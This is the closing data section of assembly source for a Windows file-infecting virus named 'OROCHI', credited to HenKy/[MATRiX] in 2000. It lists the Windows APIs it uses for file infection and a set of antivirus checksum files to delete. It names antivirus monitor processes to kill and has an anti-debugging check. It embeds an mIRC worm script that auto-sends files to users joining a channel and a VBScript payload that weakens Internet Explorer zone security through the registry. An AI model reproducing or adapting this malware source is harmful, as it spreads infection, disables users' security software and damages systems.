   GetProcAddress_Name     DB      'GetProcAddress', 0

   API_Names:

                           DB      'GetSystemTime',0

                           DB      'GetCurrentDirectoryA', 0

                           DB      'SetCurrentDirectoryA', 0

                           DB      'GetWindowsDirectoryA', 0

                           DB      'GetSystemDirectoryA', 0

                           DB      'FindFirstFileA', 0

                           DB      'FindNextFileA', 0

                           DB      'FindClose', 0

                           DB      'GetFileAttributesA', 0

                           DB      'SetFileAttributesA', 0

                           DB      'CreateFileA', 0

                           DB      'CloseHandle', 0

                           DB      'GetFileTime', 0

                           DB      'SetFileTime', 0

                           DB      'GetFileSize', 0

                           DB      'SetFilePointer', 0

                           DB      'ReadFile', 0

                           DB      'WriteFile', 0

                           DB      'IsDebuggerPresent',0

                           DB      'DeleteFileA',0

                           DB      'GetModuleHandleA', 0

   ZEROEZ                  DB      0

   XTABLE                  LABEL BYTE

   ANTIVIR_DAT             DB      "Anti-viR.DaT",0

   CHKLIST_DAT             DB      "ChklisT.DaT",0

   CHKLIST_TAV             DB      "ChklisT.TaV",0

   CHKLIST_MS              DB      "ChklisT.MS",0

   NODICE                  DB      "NoD32.000",0

   AVP_CRC                 DB      "AvP.CrC",0

   IVB_NTZ                 DB      "IvB.NtZ",0

   SMARTCHK_MS             DB      "SmartchK.MS",0

   SMARTCHK_CPS            DB      "SmartchK.CpS",0

   AVP                     DB      "KerneL.AvC",0

   SCAN                    DB      "ScaN.DaT",0

   NAV                     DB      "Dec2.DLL",0

   PANDA                   DB      "AP.ViR",0

   MORE                    DB      "AP.SiG",0

   TB                      DB      "TbscaN.SiG",0

   ENDA                    DB       0

   FLAG                    DB       0

   FLAGELO                 DB       0

   Monitors2Kill           label   byte

                           DB      "AVP Monitor",0

                           DB      "Amon Antivirus Monitor",0

                           DB      "Norton AntiVirus",0

                       DB      0CCh


   drive_f                 DB      'F:\',0

   drive_c                 DB      'C:\',0

   drive_h                 DB      'H:\',0

   drive_e                 DB      'E:\',0

   drive_d                 DB      'D:\',0

   drive_g                 DB      'G:\',0

   dirfiles                DB      '*.',0

   prev_dir                DB      '..',0

   TYPEXX                  DB      0

   ;==================================== WEB & IRC CODE =============================================

   IRC_CODE:

             DB      "[script]",10
             DB      "n0=ON 1:JOIN:#: {/if ($nick==$me) { halt }",10
             DB      "n1=/dcc send $nick c:\windows\calc.exe",10   ; ARGHHHHH!!! SUXZOREEEE!
             DB      "n2=}",10
             DB      "n3=ON 1:TEXT:*OROCHI*:#:/quit W32/HTM/MIRC-OROCHI ViRUS",10
             DB      "n4=ON 1:TEXT:*virus*:#:/ignore -u666 $nick",10
             DB      "n5=ON 1:CONNECT: {",10
             DB      "n6=/msg ThE OROCHI Bl00D Ri0tS",10
             DB      "n7=}",10

   IRC_END:

   WEBCODE:
             DB      '<!--HH-->'
             DB      '<html><body>'
             DB      '<script Language="VBScript"><!--'
             DB      'Set A = CreateObject("WScript.Shell")'
             DB      'A.Regwrite"HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings
             DB      '\Zones\0\1201" , 0, "REG_DWORD"'
             DB      'A.RegWrite"HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion
             DB      '\Internet Settings\Zones\0\1201" , 0, "REG_DWORD"'
             DB      '--></script>'

   HTITLE    DB "·´¨`·-·,_,··´¨`·-·,_,··´¨`·-·,_,··´¨`·OROCHI ViRUS·,_,·-·´¨`·-·,_,··´¨`·-·,_,··´¨`·-·,_,·",0

   HTEXT     DB      "AS LONG THE HUMANS RULE THE WORLD...",0dh,0ah
             DB      "THE OROCHI AWAKENING IS NOT SO FAR AWAY...",0dh,0ah
             DB      "IS HUMANKIND TOO LATE TO AVOID DESTRUCTION?...",0dh,0ah
             DB      "WHEN THE AMBITIONS OF MANY, DRIVE THE WORLD TO THE DESTRUCTION...",0dh,0ah
             DB      "TO STOP THIS, THE OROCHI EXIST...",0dh,0ah
             DB      "THE OROCHI... GOD'S MESSENGER? PERHAPS...",0dh,0ah
             DB      "MAY BE HUMANKIND IS AT FAULT...",0dh,0ah
             DB      "HUMANKIND: AMBITIOUS, CRUEL AND RESILIENT...",0dh,0ah
             DB      "BUT IT CANNOT BE FORGOTTEN... THE REAL ENEMY IS NOT OROCHI",0dh,0ah
             DB      "HUMANKIND'S REAL ENEMY?",0dh,0ah
             DB      "WE'VE SEEN THE ENEMY...",0dh,0ah
             DB      "AND IT IS US...",0dh,0ah
             DB      "",0dh,0ah,0

   EXTASIA   DB "OROCHI-"
             virussize
             DB " C0dE BY HenKy/[MATRiX] IN SpaiN Y2K",0
   WEB_END:

   Rda_end:

   Virus_End:

   align 4

   ;=============================== MY TEMPORARY BUFFER ======================================

   API_Addresses:


   GetSystemTime           DD      0

   PADDI                   EQU     $ - 3

   GetCurrentDirectoryA    DD      0

   SetCurrentDirectoryA    DD      0

   GetWindowsDirectoryA    DD      0

   GetSystemDirectoryA     DD      0

   FindFirstFileA          DD      0

   FindNextFileA           DD      0

   FindClose               DD      0

   GetFileAttributesA      DD      0

   SetFileAttributesA      DD      0

   CreateFileA             DD      0

   CloseHandle             DD      0

   GetFileTime             DD      0

   SetFileTime             DD      0

   GetFileSize             DD      0

   SetFilePointer          DD      0

   ReadFile                DD      0

   WriteFile               DD      0

   IsDebuggerPresent       DD      0

   DeleteFileA             DD      0

   GetModuleHandleA        DD      0

   GetProcAddress          DD      0

   BitBlt                  DD      0

   GetDC                   DD      0

   FindWindowA             DD      0

   PostMessageA            DD      0

   MessageBoxA             DD      0

   USER32                  DD      0

   GDI32                   DD      0

   x                       DD      0

   y                       DD      0

   screen                  DD      0

   SYSTEMTIME              label   byte

   ST_wYear                DW      ?

   ST_wMonth               DW      ?

   ST_wDayOfWeek           DW      ?

   ST_wDay                 DW      ?

   ST_wHour                DW      ?

   ST_wMinute              DW      ?

   ST_wSecond              DW      ?

   ST_wMilliseconds        DW      ?

   imp_tbl_desc            DD      ?

   Time_Creation           DD      0, 0

   Time_Last_Access        DD      0, 0

   Time_Last_Write         DD      0, 0

   Bytes_Read              DD      0

   Header                  DB      92 DUP(0)

   Last_Section_Header     DB      40 DUP(0)

   Search_Record           DB      318 DUP(0)

   Current_Directory       DB      260 DUP(0)

   Windows_Directory       DB      260 DUP(0)

   System_Directory        DB      260 DUP(0)

   win32_data_thang:

   fileattr                DD      0

   createtime              DD      0,0

   lastaccesstime          DD      0,0

   lastwritetime           DD      0,0

   filesize                DD      0,0

   resv                    DD      0,0

   fullname                DD      256 dup (0)

   realname                DD      256 dup (0)

   ANSI_Target             DB      260 DUP(0)

   Last_Obj_Table          DB      40 DUP(0)

   Virus_RVA               DD      0

   Host_EIP                DD      0

   IRC                     DB      0

   Buffer                  DB      Virus_Size DUP(0)



   END CHRIS

   ;Yatta ze!" (I did it!)
